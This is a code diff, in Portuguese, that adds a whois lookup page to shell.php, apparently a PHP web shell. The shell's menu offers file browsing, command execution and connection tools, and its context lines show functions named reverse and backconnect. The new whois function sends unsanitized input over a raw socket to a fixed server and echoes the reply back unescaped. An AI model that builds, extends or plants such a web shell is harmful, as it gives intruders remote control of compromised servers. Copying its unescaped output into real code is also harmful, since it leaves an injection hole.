@@ -312,6 +312,7 @@ echo "
 		<ul>
 			<li><a href='shell.php'>Arquivos</a></li>
 			<li><a href='?pag=comandos'>Comandos</a></li>
+			<li><a href='?pag=whois'>Whois</a></li>
 			<li><a href='?pag=conexao'>Conexão</a></li>
 			<li><a href='?pag=lookup'>Lookup</a></li>
 			<li><a href='?pag=info'>Info</a></li>
@@ -421,6 +422,10 @@ else if($page == 'info'){
 else if($page == 'renomear'){
 	$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
 	renomear($arquivo, $dir);
+}
+
+else if($page == 'whois'){
+	whois();
 }
 
 else{
@@ -734,6 +739,22 @@ function reverse($host){
 			echo fgets($p,1000)."<br/>";
 		}
 	}
+
+function whois(){
+	echo "
+	<form action='shell.php?pag=whois' method='post'>
+	Dominio: <input type='text' name='domainname'>
+	<input type='submit' name='startwhois' value='Ir'>
+	</form>
+	";
+	$whoisdomain = $_POST['domainname'];
+	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	socket_connect($socket, '200.160.2.3', 43);
+	socket_write($socket, $whoisdomain."\r\n");
+	$result  = socket_read($socket, 1024);
+	echo $result;
+	socket_close($socket);
+}
 
 function backconnect()
 {
